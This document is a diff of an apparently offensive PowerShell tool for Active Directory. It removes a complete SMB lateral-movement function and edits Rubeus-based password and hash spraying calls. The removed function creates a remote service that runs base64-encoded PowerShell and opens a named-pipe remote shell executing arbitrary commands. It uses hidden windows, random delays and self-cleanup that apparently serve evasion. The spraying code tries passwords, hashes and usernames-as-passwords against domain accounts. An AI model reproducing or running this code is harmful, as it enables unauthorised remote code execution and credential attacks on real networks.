@@ -121,11 +121,11 @@ if ($Method -ne "" -and $GenRelayList){
         return
 }
 
-if ($Method -ne "" -and $Method -notin ("WMI", "WinRM", "MSSQL", "Psexec", "RDP", "SMB")){
+if ($Method -ne "" -and $Method -notin ("WMI", "WinRM", "MSSQL", "Psexec", "RDP")){
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Invalid Method specified"
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specify either WMI, WinRM, MSSQL, SMB or RDP"
+        Write-Host "Specify either WMI, WinRM, MSSQL, PSexec or RDP"
         return
 }
 
@@ -1148,333 +1148,6 @@ $Command = "powershell.exe -ep bypass -enc $base64Command"
 
 $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
 $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
-
-################################################################################################################
-################################################ Function: SMB #################################################
-################################################################################################################
-Function Method-SMB{
-
-$MaxConcurrentJobs = $Threads
-$SMBJobs = @()
-Foreach ($Computer in $Computers){
-    $OS = $computer.Properties["operatingSystem"][0]
-    $ComputerName = $computer.Properties["dnshostname"][0]
-$ScriptBlock = {
-Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles)
-
-$tcpClient = New-Object System.Net.Sockets.TcpClient -ErrorAction SilentlyContinue
-	$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
-	$wait = $asyncResult.AsyncWaitHandle.WaitOne(1000)
-	IF ($wait){ 
-		$tcpClient.EndConnect($asyncResult)
-		$tcpClient.Close()
-function Invoke-SMBRemoting {
-	
-	param (
-		[string]$PipeName,
-		[string]$Target,
-		[string]$ServiceName,
-		[string]$Command
-	)
-
-$ServiceAccess = cmd /c sc \\$Target query
-if ($ServiceAccess.IndexOf("[SC] OpenSCManager FAILED 5:") -ne -1) {
-    Write-Host "SMB " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "   " -NoNewline
-
-    try {
-        $Ping = New-Object System.Net.NetworkInformation.Ping
-        $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-        Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } catch {
-        Write-Host ("{0,-16}" -f "") -NoNewline
-    }
-
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-    Write-Host "ACCESS DENIED"
-    return
-} elseif ($Command -eq "") {
-    Write-Host "SMB " -ForegroundColor "Yellow" -NoNewline
-    Write-Host "   " -NoNewline
-
-    try {
-        $Ping = New-Object System.Net.NetworkInformation.Ping
-        $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-        Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } catch {
-        Write-Host ("{0,-16}" -f "") -NoNewline
-    }
-
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-    Write-Host "SUCCESS "
-    return
-}
-
-	$ErrorActionPreference = "SilentlyContinue"
-	$WarningPreference = "SilentlyContinue"
-	
-	if (-not $Target) {
-		Write-Output " [-] Please specify a target"
-		return
-	}
-	
-	if(!$PipeName){
-		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
-		$randomvalue = $randomvalue -join ""
-		$PipeName = $randomvalue
-	}
-	
-	if(!$ServiceName){
-		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
-		$randomvalue = $randomvalue -join ""
-		$ServiceName = "Service_" + $randomvalue
-	}
-	
-	$ServerScript = @"
-`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1024, 1024, `$null)
-
-`$pipeServer.WaitForConnection()
-
-`$sr = New-Object System.IO.StreamReader(`$pipeServer)
-`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
-
-while (`$true) {
-	`$command = `$sr.ReadLine()
-
-	if (`$command -eq "exit") {
-		`$sw.WriteLine("Exiting...")
-		`$sw.Flush()
-		break
-	} else {
-		`$result = Invoke-Expression `$command
-
-		if (`$result -is [System.Array]) {
-			foreach (`$line in `$result) {
-				`$sw.WriteLine(`$line)
-			}
-		} else {
-			`$sw.WriteLine(`$result)
-		}
-
-		`$sw.WriteLine("###END###")  # Delimiter indicating end of command result
-		`$sw.Flush()
-	}
-}
-
-`$pipeServer.Disconnect()
-"@
-	
-	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
-	$FullCommand = "`$encstring = `"$B64ServerScript`"; `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
-	$b64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
-	$arguments = "\\$Target create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64command`""
-	$startarguments = "\\$Target start $ServiceName"
-    $RandomSleepDuration = Get-Random -Minimum 500 -Maximum 9000
-    
-    Start-Sleep -Milliseconds $RandomSleepDuration
-	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-	Start-Sleep -Milliseconds $RandomSleepDuration
-	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
-
-	
-	# Get the current process ID
-	$currentPID = $PID
-	
-	# Embedded monitoring script
-	$monitoringScript = @"
-`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
-`$TargetServer = "$Target"
-`$primaryScriptProcessId = $currentPID
-
-while (`$true) {
-	Start-Sleep -Seconds 5 # Check every 5 seconds
-
-	# Check if the primary script is still running using its Process ID
-	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }
-
-	if (-not `$process) {
-		# If the process is not running, delete the service
-		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
-		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
-		break # Exit the monitoring script
-	}
-}
-"@
-	
-	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
-	
-	# Execute the embedded monitoring script in a hidden window
-Start-Sleep -Milliseconds $RandomSleepDuration
-	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
-	
-	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Target", $PipeName, 'InOut')
-	$pipeClient.Connect()
-
-	$sr = New-Object System.IO.StreamReader($pipeClient)
-	$sw = New-Object System.IO.StreamWriter($pipeClient)
-
-	$serverOutput = ""
-	
-	try{
-		if ($Command) {
-			$fullCommand = "$Command | Out-String"
-			$sw.WriteLine($fullCommand)
-			$sw.Flush()
-			while ($true) {
-				$line = $sr.ReadLine()
-				if ($line -eq "###END###") {
-            Write-Host "SMB " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "   " -NoNewline
-            
-            try {$Ping = New-Object System.Net.NetworkInformation.Ping
-            $IP = $($Ping.Send("$ComputerName").Address).IPAddressToString
-            Write-Host ("{0,-16}" -f $IP) -NoNewline}
-            catch { Write-Host ("{0,-16}" -f "") -NoNewline}
-            
-            Write-Host "   " -NoNewline
-            Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-            Write-Host "   " -NoNewline
-            Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-            Write-Host "   " -NoNewline
-            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-            Write-Host "SUCCESS "
-					Write-Output ""
-					Write-Output $serverOutput.Trim()
-					Write-Output ""
-					return
-				} else {
-					$serverOutput += "$line`n"
-				}
-			}
-		} 
-		
-		else {
-			while ($true) {
-				
-				# First, fetch the current remote path
-				$sw.WriteLine("(Get-Location).Path | Out-String")
-				$sw.Flush()
-				
-				$remotePath = ""
-				while ($true) {
-					$line = $sr.ReadLine()
-
-					if ($line -eq "###END###") {
-						# Remove any extraneous whitespace, newlines etc.
-						$remotePath = $remotePath.Trim()
-						break
-					} else {
-						$remotePath += "$line`n"
-					}
-				}
-				
-				$computerNameOnly = $Target -split '\.' | Select-Object -First 1
-				$promptString = "[$computerNameOnly]: PS $remotePath> "
-				Write-Host -NoNewline $promptString
-				$userCommand = [Console]::ReadLine()
-				$fullCommand = "$userCommand | Out-String"
-				$sw.WriteLine($fullCommand)
-				$sw.Flush()
-
-				if ($userCommand -eq "exit") {
-					Write-Output ""
-					break
-				}
-				
-				Write-Output ""
-
-				$serverOutput = ""
-				while ($true) {
-					$line = $sr.ReadLine()
-
-					if ($line -eq "###END###") {
-						Write-Output $serverOutput.Trim()
-						Write-Output ""
-						break
-					} else {
-						$serverOutput += "$line`n"
-					}
-				}
-			}
-		}
-	}
-	
-	finally{
-		$stoparguments = "\\$Target delete $ServiceName"
-		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
-		if ($sw) { $sw.Close() }
-		if ($sr) { $sr.Close() }
-	}
-	
-}
-
-Invoke-SMBRemoting -Target $ComputerName -Command $Command
-
-}
-    }
-        while (($SMBJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
-            Start-Sleep -Milliseconds 500
-        }
-
-        $SMBJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName,  $NameLength, $OSLength, $LSA, $LocalAuth, $Password, $Username, $SuccessOnly, $KerbDump, $MimiTickets, $ShowOutput, $ConsoleHistory, $UserFiles
-        [array]$SMBJobs += $SMBJob
-
-        # Check if the maximum number of concurrent jobs has been reached
-        if ($SMBJobs.Count -ge $MaxConcurrentJobs) {
-            do {
-                # Wait for any job to complete
-                $JobFinished = $null
-                foreach ($Job in $SMBJobs) {
-                    if ($Job.State -eq 'Completed') {
-                        $JobFinished = $Job
-                        break
-                    }
-                }
-
-                if ($JobFinished) {
-                    # Retrieve the job result and remove it from the job list
-                    $Result = Receive-Job -Job $JobFinished
-                    # Process the result as needed
-                    $Result
-
-                    $SMBJobs = $SMBJobs | Where-Object { $_ -ne $JobFinished }
-                    Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
-                }
-            }
-            until (-not $JobFinished)
-        }
-    }
-
-    # Wait for any remaining jobs to complete
-    $SMBJobs | ForEach-Object {
-        $JobFinished = $_ | Wait-Job -Timeout 100
-
-        if ($JobFinished) {
-            # Retrieve the job result and remove it from the job list
-            $Result = Receive-Job -Job $JobFinished
-            # Process the result as needed
-            $Result
-
-            Remove-Job -Job $JobFinished -Force -ErrorAction SilentlyContinue
-        }
-    }
-
-    # Clean up all remaining jobs
-    $SMBJobs | Remove-Job -Force -ErrorAction SilentlyContinue
-}
-
-
-
 
 
 ################################################################################################################
@@ -3748,7 +3421,7 @@ if ($Spray -and $Hash -eq $null){}
 if ($Spray -and !$EmptyPassword){}
 
             
-$directoryEntry = [ADSI]"LDAP://$domain"
+$domainPath = $directoryEntry.Path
 $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
 $searcher.PropertiesToLoad.AddRange(@("samAccountName", "badPwdCount"))
     
@@ -3802,8 +3475,8 @@ Write-Output " - Removed disabled accounts from spraying"
                     }
             }
 
-            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
-            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash /domain:$domain" | Out-String}
+            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash" | Out-String}
+            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash" | Out-String}
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3858,7 +3531,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$Password /domain:$domain" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$Password" | Out-String
         
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3912,7 +3585,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$UserToSpray /domain:$domain" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$UserToSpray" | Out-String
         
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3945,7 +3618,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$ComputerToSpray /password:$ComputerToSprayPassword /domain:$domain" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$ComputerToSpray /password:$ComputerToSprayPassword" | Out-String
 
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3994,7 +3667,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /domain:$domain /password:" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:" | Out-String
         
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -4289,7 +3962,6 @@ IF ($Method -eq "MSSQL"){Method-MSSQL}
 IF ($Method -eq "Psexec"){Method-PsExec}
 IF ($Method -eq "WMI"){Method-WMIexec}
 IF ($Method -eq "RDP"){Method-RDP}
-IF ($Method -eq "SMB"){Method-SMB}
 IF ($GenRelayList){GenRelayList}
 IF ($SessionHunter){SessionHunter}
 IF ($Spray){Spray}
